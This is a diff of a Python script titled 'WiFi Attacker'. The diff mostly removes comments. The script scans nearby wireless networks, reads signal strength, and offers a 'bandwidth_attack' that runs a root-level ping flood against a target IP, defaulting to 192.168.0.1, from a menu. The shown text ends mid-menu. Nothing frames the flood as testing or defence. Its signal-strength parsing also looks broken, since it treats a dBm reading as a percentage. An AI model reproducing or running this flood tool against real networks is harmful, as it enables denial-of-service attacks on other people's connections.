@@ -4,27 +4,22 @@ import time
 def scan_networks(timeout=10):
     """Scan wireless networks for available SSIDs."""
     
-    # Run scanning command with timeout
     result = os.popen(f"sudo iwlist wlan0 scan | grep -i 'ESSID:\"\\|Quality'").read()
     
-    # Print results
     print("[+] Detected Networks:")
     print(result)
 def target_signal():
     """Find WiFi signal strength."""
     
-    # Get current connection status
     result = os.popen("iwconfig wlan0 | grep -i quality").read().strip()
     
     if "Quality" in result:
-        # Extract and format signal strength percentage
         rssi = [line.split(' ')[-1] for line in result.split('\n') if 'Signal level=' in line][0]
         
         try:
             percent = abs(int(rssi[:-3]))
             print(f"[+] Current Signal Strength: {percent}%")
-            
-            # Check if signal is weak
+        
             if int(percent) < 50:
                 print("[!] Weak signal detected!")
                 
@@ -35,7 +30,6 @@ def target_signal():
 def bandwidth_attack(target_ip="192.168.0.1", duration=30):
     """Execute ping flood against target."""
     
-    # Check if script is run as root
     if os.geteuid() != 0:
         print("[!] Script must be executed with root privileges.")
         sys.exit(1)
@@ -43,20 +37,17 @@ def bandwidth_attack(target_ip="192.168.0.1", duration=30):
     print(f"[+] Target IP: {target_ip}")
     
     try:
-        # Execute ping flood command
         cmd = f"ping -c {duration} -f {target_ip}"
-        os.system(cmd)  # This is a simplified version, actual implementation uses Scapy
+        os.system(cmd)
         
     except KeyboardInterrupt:
         print("\n[!] Attack terminated.")
 if __name__ == "__main__":
     
-    # Check if wireless adapter exists
     try:
         wlan0 = open("/sys/class/net/wlan0/address", "r").read().strip()
         print(f"[+] Wireless adapter found: {wlan0}")
         
-        # Main menu loop
         while True:
             choice = input("""
 WiFi Attacker - Select action:
